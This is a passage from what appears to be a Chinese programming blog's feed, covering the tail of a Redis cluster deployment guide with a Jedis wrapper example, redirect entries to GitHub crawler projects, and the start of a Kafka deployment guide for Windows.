start|stop|restart</span><span class="token keyword">case</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token keyword">in</span>start<span class="token punctuation">)</span>start<span class="token punctuation">;</span><span class="token punctuation">;</span>stop<span class="token punctuation">)</span>stop<span class="token punctuation">;</span><span class="token punctuation">;</span>restart<span class="token punctuation">)</span>stopstart<span class="token punctuation">;</span><span class="token punctuation">;</span>*<span class="token punctuation">)</span><span class="token function">printf</span> <span class="token string">'Usage: %s {start|stop|restart}\n'</span><span class="token string">"<span class="token variable">$prog</span>"</span><span class="token keyword">exit</span> 1<span class="token punctuation">;</span><span class="token punctuation">;</span>esac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是shell脚本，保存为<code>redis-cluster.sh</code>（文件名任意）即可执行（若无法执行可能是换行符问题，可尝试通过<code>dos2unix</code>命令修正换行符）。</p><p>使用方式如下：</p><pre class="line-numbers language-bash"><code class="language-bash">sh redis-cluster.sh start    <span class="token comment" spellcheck="true"># 启动</span>sh redis-cluster.sh stop     <span class="token comment" spellcheck="true"># 停止</span>sh redis-cluster.sh restart  <span class="token comment" spellcheck="true"># 重启</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="8-附：Redis核心配置文件汉化版注释"><a href="#8-附：Redis核心配置文件汉化版注释" class="headerlink" title="8. 附：Redis核心配置文件汉化版注释"></a>8. 附：Redis核心配置文件汉化版注释</h2><h3 id="8-1-服务配置redis-conf"><a href="#8-1-服务配置redis-conf" class="headerlink" title="8.1. 服务配置redis.conf"></a>8.1. 服务配置redis.conf</h3><blockquote><p>● 汉化配置文件redis-chs.conf下载：<a href="https://share.weiyun.com/57e0NrS">https://share.weiyun.com/57e0NrS</a> 密码：m48s6g ●</p></blockquote><h3 id="8-2-哨兵配置sentinel-conf"><a href="#8-2-哨兵配置sentinel-conf" class="headerlink" title="8.2. 哨兵配置sentinel.conf"></a>8.2. 哨兵配置sentinel.conf</h3><blockquote><p>● 汉化配置文件sentinel-chs.conf下载：<a href="https://share.weiyun.com/5eFlsU6">https://share.weiyun.com/5eFlsU6</a> 密码：4vr68i ●</p></blockquote><h2 id="9-附：Jedis客户端封装"><a href="#9-附：Jedis客户端封装" class="headerlink" title="9. 附：Jedis客户端封装"></a>9. 附：Jedis客户端封装</h2><p>官方提供的Jedis的POM如下：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>redis.clients<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jedis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.9.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Jedis是在Java中比较强大的Redis客户端连接工具，暴露了很多Redis的API接口，能够很灵活地操作Redis。但是也正由于暴露了太多Redis的连接细节、过份灵活，在生产环境中使用并不方便。</p><p>为了解决这些缺点，使之更易于使用，我在2.9.0版本之上做了封装，其主要特点有：</p><ul><li>屏蔽Jedis与JedisCluster的连接细节和差异，统一封装成RedisClient类，并内置连接池</li><li>统一Jedis与JedisCluster连接的配置项，封装成RedisBean类，主要供RedisClient使用</li><li>屏蔽byte[]数据类型，所有实现了序列化接口的对象均可直接在Redis进行读写</li><li>保留String数据类型（并不会序列化成byte[]，目的是保留与其他程序交互数据的方式）</li><li>把Redis的Map封装成RedisMap&lt;T&gt;类（key强制为String），暴露API模仿Java的Map</li><li>把Redis的Set封装成RedisSet&lt;T&gt;类，暴露API模仿Java的Set</li><li>把Redis的List封装成RedisList&lt;T&gt;类，暴露API模仿Java的List</li><li>把Redis的单键值对封装成RedisObj&lt;T&gt;类</li></ul><p>下面是各个场景的使用样例演示（源码见<a href="https://github.com/lyy289065406/exp-libs/tree/master/src/main/java/exp/libs/warp/db/redis">Github</a>）：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> exp<span class="token punctuation">.</span>libs<span class="token punctuation">.</span>warp<span class="token punctuation">.</span>db<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>RedisClient<span class="token punctuation">;</span><span class="token keyword">import</span> exp<span class="token punctuation">.</span>libs<span class="token punctuation">.</span>warp<span class="token punctuation">.</span>db<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>bean<span class="token punctuation">.</span>RedisList<span class="token punctuation">;</span><span class="token keyword">import</span> exp<span class="token punctuation">.</span>libs<span class="token punctuation">.</span>warp<span class="token punctuation">.</span>db<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>bean<span class="token punctuation">.</span>RedisMap<span class="token punctuation">;</span><span class="token keyword">import</span> exp<span class="token punctuation">.</span>libs<span class="token punctuation">.</span>warp<span class="token punctuation">.</span>db<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>bean<span class="token punctuation">.</span>RedisObj<span class="token punctuation">;</span><span class="token keyword">import</span> exp<span class="token punctuation">.</span>libs<span class="token punctuation">.</span>warp<span class="token punctuation">.</span>db<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>bean<span class="token punctuation">.</span>RedisSet<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * &lt;PRE> * RedisClient测试/场景演示. * &lt;/PRE> * &lt;B>PROJECT : &lt;/B> exp-libs * &lt;B>SUPPORT : &lt;/B> &lt;a href="http://www.exp-blog.com" target="_blank">www.exp-blog.com&lt;/a>  * @version   2018-07-31 * @author    EXP: 272629724@qq.com * @since     jdk版本：jdk1.6 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestRedisClient</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">/*********************** Redis连接样例 ***********************/</span>        <span class="token comment" spellcheck="true">// 场景1  -  Redis 单机模式</span>        <span class="token comment" spellcheck="true">// 127.0.0.1:6379</span>        RedisClient redis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RedisClient</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">6379</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 场景2  -  Redis 主从模式 </span>        <span class="token comment" spellcheck="true">// （若用于[读写]只能连接主机，若仅[读]则可连接主/从，但无论如何只能连接其中一台）</span>        <span class="token comment" spellcheck="true">// 主机： 127.0.0.1:6379</span>        <span class="token comment" spellcheck="true">// 从机： 127.0.0.1:6380, 127.0.0.1:6381, 127.0.0.1:6382</span>        redis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RedisClient</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">6379</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 场景3  -  Redis 哨兵模式 </span>        <span class="token comment" spellcheck="true">// （若用于[读写]只能连接主机，若仅[读]则可连接主/从，但无论如何只能连接其中一台，哨兵不允许连接）</span>        <span class="token comment" spellcheck="true">// 主机： 127.0.0.1:6379</span>        <span class="token comment" spellcheck="true">// 从机： 127.0.0.1:6380, 127.0.0.1:6381, 127.0.0.1:6382</span>        <span class="token comment" spellcheck="true">// 哨兵： 127.0.0.1:26380, 127.0.0.1:26381, 127.0.0.1:26382</span>        redis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RedisClient</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">6379</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 场景4  -  Redis 集群模式</span>        <span class="token comment" spellcheck="true">// 集群节点 （需同时连接所有节点）：</span>        <span class="token comment" spellcheck="true">//   127.0.0.1:6390, 127.0.0.1:6391, 127.0.0.1:6392</span>        <span class="token comment" spellcheck="true">//   127.0.0.1:6393, 127.0.0.1:6394, 127.0.0.1:6395</span>        redis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RedisClient</span><span class="token punctuation">(</span>                <span class="token string">"127.0.0.1:6390"</span><span class="token punctuation">,</span> <span class="token string">"127.0.0.1:6391"</span><span class="token punctuation">,</span>                 <span class="token string">"127.0.0.1:6392"</span><span class="token punctuation">,</span> <span class="token string">"127.0.0.1:6393"</span><span class="token punctuation">,</span>                 <span class="token string">"127.0.0.1:6394"</span><span class="token punctuation">,</span> <span class="token string">"127.0.0.1:6395"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*********************** Redis操作样例 ***********************/</span>        <span class="token comment" spellcheck="true">// RedisMap示例</span>        <span class="token keyword">final</span> String REDIS_MAP_KEY <span class="token operator">=</span> <span class="token string">"REDIS_MAP_KEY"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 这个Map对象在Redis中的键值</span>        RedisMap<span class="token operator">&lt;</span>SerialObject<span class="token operator">></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RedisMap</span><span class="token operator">&lt;</span>SerialObject<span class="token operator">></span><span class="token punctuation">(</span>REDIS_MAP_KEY<span class="token punctuation">,</span> redis<span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"site"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">SerialObject</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"http://exp-blog.com"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"mail"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">SerialObject</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"289065406@qq.com"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"site"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"mail"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// RedisList示例</span>        <span class="token keyword">final</span> String REDIS_LIST_KEY <span class="token operator">=</span> <span class="token string">"REDIS_LIST_KEY"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 这个List对象在Redis中的键值</span>        RedisList<span class="token operator">&lt;</span>SerialObject<span class="token operator">></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RedisList</span><span class="token operator">&lt;</span>SerialObject<span class="token operator">></span><span class="token punctuation">(</span>REDIS_LIST_KEY<span class="token punctuation">,</span> redis<span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SerialObject</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"EXP-LIST"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// RedisSet示例</span>        <span class="token keyword">final</span> String REDIS_SET_KEY <span class="token operator">=</span> <span class="token string">"REDIS_SET_KEY"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 这个Set对象在Redis中的键值</span>        RedisSet<span class="token operator">&lt;</span>SerialObject<span class="token operator">></span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RedisSet</span><span class="token operator">&lt;</span>SerialObject<span class="token operator">></span><span class="token punctuation">(</span>REDIS_SET_KEY<span class="token punctuation">,</span> redis<span class="token punctuation">)</span><span class="token punctuation">;</span>        set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SerialObject</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">"http://exp-blog.com"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SerialObject</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">"289065406@qq.com"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>set<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>set<span class="token punctuation">.</span><span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        set<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// RedisObj示例</span>        <span class="token keyword">final</span> String REDIS_OBJ_KEY <span class="token operator">=</span> <span class="token string">"REDIS_OBJ_KEY"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 这个Obj对象在Redis中的键值</span>        RedisObj<span class="token operator">&lt;</span>SerialObject<span class="token operator">></span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RedisObj</span><span class="token operator">&lt;</span>SerialObject<span class="token operator">></span><span class="token punctuation">(</span>REDIS_OBJ_KEY<span class="token punctuation">,</span> redis<span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SerialObject</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">"EXP-OBJ"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 断开redis连接</span>        redis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * &lt;pre>     * 测试用的序列化对象.     * 必须实现java.io.Serializable接口     * &lt;/pre>     */</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">SerialObject</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token operator">-</span>6911765769239092862L<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>        <span class="token keyword">private</span> String value<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token function">SerialObject</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">,</span> String value<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> id <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> value<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="10-资源下载"><a href="#10-资源下载" class="headerlink" title="10. 资源下载"></a>10. 资源下载</h2><ul><li><a href="http://download.csdn.net/download/lyy289065406/10665855">本文全文下载</a></li><li><a href="https://share.weiyun.com/5EbAOfV">文中配置文件/脚本下载（密码：359wqw）</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 集群 </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哔哩哔哩插件姬</title>
      <link href="/articles/crawler/bilibili-plugin/"/>
      <url>/articles/crawler/bilibili-plugin/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/lyy289065406/bilibili-plugin/">正在重定向到内容页面 ……</a></p></blockquote><p><a href="https://github.com/lyy289065406/bilibili-plugin/">如果您的浏览器没有自动跳转， 请点击这里</a></p>    <!-- 自动跳转 -->    <meta http-equiv="refresh" content="0; url=https://github.com/lyy289065406/bilibili-plugin/"><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> B站 </tag>
            
            <tag> 插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQ 空间爬虫（Java 版）</title>
      <link href="/articles/crawler/jzone-crawler/"/>
      <url>/articles/crawler/jzone-crawler/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/lyy289065406/jzone-crawler/">正在重定向到内容页面 ……</a></p></blockquote><p><a href="https://github.com/lyy289065406/jzone-crawler/">如果您的浏览器没有自动跳转， 请点击这里</a></p>    <!-- 自动跳转 -->    <meta http-equiv="refresh" content="0; url=https://github.com/lyy289065406/jzone-crawler/"><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> QQ </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQ 空间爬虫（Python 版）</title>
      <link href="/articles/crawler/pyzone-crawler/"/>
      <url>/articles/crawler/pyzone-crawler/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/lyy289065406/pyzone-crawler/">正在重定向到内容页面 ……</a></p></blockquote><p><a href="https://github.com/lyy289065406/pyzone-crawler/">如果您的浏览器没有自动跳转， 请点击这里</a></p>    <!-- 自动跳转 -->    <meta http-equiv="refresh" content="0; url=https://github.com/lyy289065406/pyzone-crawler/"><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> QQ </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速部署单机 kafka 集群（win 环境）</title>
      <link href="/articles/arch/kuai-su-bu-shu-dan-ji-kafka-ji-qun/"/>
      <url>/articles/arch/kuai-su-bu-shu-dan-ji-kafka-ji-qun/</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>本文不讲kafka集群原理，只谈部署步骤。</p><p>默认读者已对kafka有最基本的认知，纯粹作为部署笔记，方便回忆。</p><p>另外<strong>本文是基于Windows部署的，Linux的步骤是基本相同的</strong>（只是启动脚本位置不同）。</p><p>由于kafka的运行依赖于zookeeper，所以在运行kafka之前，需要先安装并运行zookeeper。不过本文没有使用kafka内置的zookeeper，而是使用《<a href="../kuai-su-bu-shu-dan-ji-zookeeper-ji-qun/">快速部署单机zookeeper集群（win环境）</a>》里的zookeeper集群，但原理是相同的。</p><h2 id="2-环境"><a href="#2-环境" class="headerlink" title="2. 环境"></a>2. 环境</h2><ul><li>JDK ： 1.8</li><li>zookeeper ： 3.4.7</li><li>zookeeper集群规模 ： 3</li><li>kafka ： 2.12-2.0.0</li><li>kafka集群类型： single broker（单节点单boker集群，亦即kafka只启一个broker消息中间件服务，producer、consumer、broker均通过zookeeper集群交换消息，具体可参考这篇文章：《<a href="https://www.cnblogs.com/5iTech/articles/6043224.html">kafka集群的三种部署方式</a>》）</li><li>kafka安装目录 ： <font color="blue">%INSTALL_DIR%</font> = E:\apache\apache-kafka（此处定义变量是为了下文方便说明，<strong>实际部署时应使用实际路径而非变量</strong>）</li></ul><p><img src="./01.png"></p><h2 id="3-安装"><a href="#3-安装" class="headerlink" title="3. 安装"></a>3. 安装</h2><p>到kafka官网下载最新版：<a href="http://kafka.apache.org/">http://kafka.apache.org/</a></p><p>解压并重命名到 <font color="blue">%INSTALL_DIR%</font> 目录。</p><h2 id="4-配置"><a href="#4-配置" class="headerlink" title="4. 配置"></a>4. 配置</h2><p>修改配置文件 <code>%INSTALL_DIR%/config/log4j.properties</code> ，找到参数 log4j.rootLogger ，在其前面一行添加如下参数（<strong>注意实际部署时把变量 <font color="blue">%INSTALL_DIR%</font> 改成实际路径</strong>）：</p><blockquote><p>kafka.logs.dir=<font color="blue">%INSTALL_DIR%</font>/tmp/kafka-logs</p></blockquote><p>修改配置文件 <code>%INSTALL_DIR%/config/server.properties</code> 的参数如下（<strong>注意实际部署时把变量 <font color="blue">%INSTALL_DIR%</font> 改成实际路径</strong>）：</p><blockquote><p>broker.id=0<br>port=9092<br>host.name=localhost<br>log.dirs=<font color="blue">%INSTALL_DIR%</font>/tmp/kafka-logs<br>num.partitions=1<br>zookeeper.connect=localhost:2181,localhost:2182,localhost:2183</p></blockquote><h2 id="5-运行"><a href="#5-运行" class="headerlink" title="5. 运行"></a>5. 运行</h2><p>修改 <code>%INSTALL_DIR%/bin/windows/kafka-run-class.bat</code> 脚本，把其中的：</p><blockquote><p>COMMAND=%JAVA% %KAFKA_HEAP_OPTS% %KAFKA_JVM_PERFORMANCE_OPTS% %KAFKA_JMX_OPTS% %KAFKA_LOG4J_OPTS% -cp <font color="red">%CLASSPATH%</font> %KAFKA_OPTS% %*</p></blockquote><p>修改为：</p><blockquote><p>COMMAND=%JAVA% %KAFKA_HEAP_OPTS% %KAFKA_JVM_PERFORMANCE_OPTS% %KAFKA_JMX_OPTS% %KAFKA_LOG4J_OPTS% -cp <font color="red">“%CLASSPATH%”</font> %KAFKA_OPTS% %*</p></blockquote><p>亦即 <font color="red">“%CLASSPATH%”</font> 需要增加<font color="red">双引号包围</font>。</p><p>这是因为在Windows环境下，JDK安装的默认路径都是 C:\Program Files\Java ，而因为其中的 Program Files 有空格，会导致kafka启动时报错：</p><blockquote><p>错误: 找不到或无法加载主类 Files\Java\jdk1.8.0_77\lib\dt.jar;<font color="red">C:\Program</font></p></blockquote><p>然后在 <font color="blue">%INSTALL_DIR%</font> 目录下新建一个 <font color="red">run-kafka.bat</font> 脚本，内容如下：</p><blockquote><p>start ./bin/windows/<strong>kafka-server-start.bat</strong> ./config/<strong>server.properties</strong></p></blockquote><p>这样只需运行 <font color="red">run-kafka.bat</font> 脚本，即可启动kafka （<font color="red">在此前需先启动zookeeper集群</font>）。<br><font color="red">至此 kafka部署完成</font>。</p><blockquote><p>若要启动多个kafka，只需要复制server.properties配置文件，并修改其中的 broker.id、port 、log.dirs参数，确保它们全局唯一，然后通过kafka-server-start.bat脚本加载不同的server.properties配置文件即可（当然直接复制整套kafka程序也是也是可以的）</p></blockquote><h2 id="6-创建主题（可选）"><a href="#6-创建主题（可选）" class="headerlink" title="6. 创建主题（可选）"></a>6. 创建主题（可选）</h2><p>在 <font color="blue">%INSTALL_DIR%</font> 目录下新建一个 <font color="red">create-topic.bat</font> 脚本，内容如下：</p><blockquote><p>start ./bin/windows/kafka-topics.bat –create –zookeeper localhost:2181 –replication-factor 1 –partitions 1 –topic <font color="red"><em>自定义主题名称</em></font></p></blockquote><p>在kafka运行期间调用这个脚本，即可创建一个消息主题（命令参数中只需指定zookeeper集群中任意一台机器即可）。</p><p>但是这种创建主题的方式比较麻烦，建议还是通过代码执行主题创建。而且这个版本的kafka默认是可以自动创建主题的，就更没有这个必要了。</p><h2 id="7-使用Java测试kafka消息发布-订阅"><a href="#7-使用Java测试kafka消息发布-订阅" class="headerlink" title="7. 使用Java测试kafka消息发布/订阅"></a>7. 使用Java测试kafka消息发布/订阅</h2><p>官方的Maven原生构件：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token 